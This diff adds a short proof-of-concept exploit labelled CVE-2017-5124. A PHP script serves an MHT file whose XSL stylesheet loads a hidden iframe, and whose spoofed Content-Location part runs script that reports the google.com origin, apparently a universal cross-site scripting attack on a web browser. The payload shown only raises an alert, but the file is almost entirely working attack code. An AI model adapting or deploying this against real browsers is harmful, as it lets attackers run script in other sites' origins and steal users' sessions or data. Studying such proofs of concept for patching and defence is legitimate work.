@@ -1,0 +1,36 @@
+<?php
+$filename=realpath("PoC.mht");
+header( "Content-type: multipart/related");
+readfile($filename);
+?>
+
+
+
+
+MIME-Version: 1.0
+Content-Type: multipart/related;
+	type="text/html";
+	boundary="----MultipartBoundary--"
+CVE-2017-5124
+
+------MultipartBoundary--
+Content-Type: application/xml;
+
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml-stylesheet type="text/xml" href="#stylesheet"?>
+<!DOCTYPE catalog [
+<!ATTLIST xsl:stylesheet
+id ID #REQUIRED>
+]>
+<xsl:stylesheet id="stylesheet" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:template match="*">
+<html><iframe style="display:none" src="https://google.com"></iframe></html>
+</xsl:template>
+</xsl:stylesheet>
+
+------MultipartBoundary--
+Content-Type: text/html
+Content-Location: https://google.com
+
+<script>alert('Location origin: '+location.origin)</script>
+------MultipartBoundary----
